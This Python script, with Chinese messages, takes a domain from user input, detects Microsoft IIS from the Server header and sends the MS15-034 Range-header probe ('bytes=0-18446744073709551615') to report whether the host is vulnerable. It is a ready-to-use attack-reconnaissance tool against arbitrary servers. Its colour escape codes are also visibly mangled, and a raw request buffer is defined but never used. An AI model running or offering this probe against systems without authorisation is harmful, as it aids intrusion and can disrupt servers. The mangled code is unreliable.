#!/usr/bin/env python
#coding:utf-8
__author__ = ';jastra';
class bg_colors:
    VULN = ';33[92m';
    NONVULN= ';33[95m';
    EXPLOIT = ';33[91m';  
try:
    import requests
    import re
except ImportError as ierr:
    print(bg_colors.EXPLOIT + "Error, looks like you don';t have %s installed", ierr)
    
def identify_iis(domain):
    req = requests.get(str(domain))
    remote_server = req.headers['server']
        
    if "Microsoft-IIS" in remote_server:
        print(bg_colors.VULN + "服务是 " + remote_server) 
        ms15_034_test(str(domain))
    else:
        print(bg_colors.NONVULN + "[-] 不是IIS\n可能是: " + remote_server) 
        
def ms15_034_test(domain):
    print(" 启动vuln检查！")
    vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n";
    headers={"Range":"bytes=0-18446744073709551615","Connection":"close"}
    req = requests.get(str(domain), headers=headers)
    #print (str(req.content))
    if 'not satisfiable' in str(req.content):
        print('============================')
        print(bg_colors.EXPLOIT + "[+] 存在漏洞")
    else:
        print(bg_colors.EXPLOIT + "[-] IIS服务无法显示漏洞是否存在. "+
               "需要手动检测")
usr_domain = input("输入域名扫描: ")
identify_iis(usr_domain)
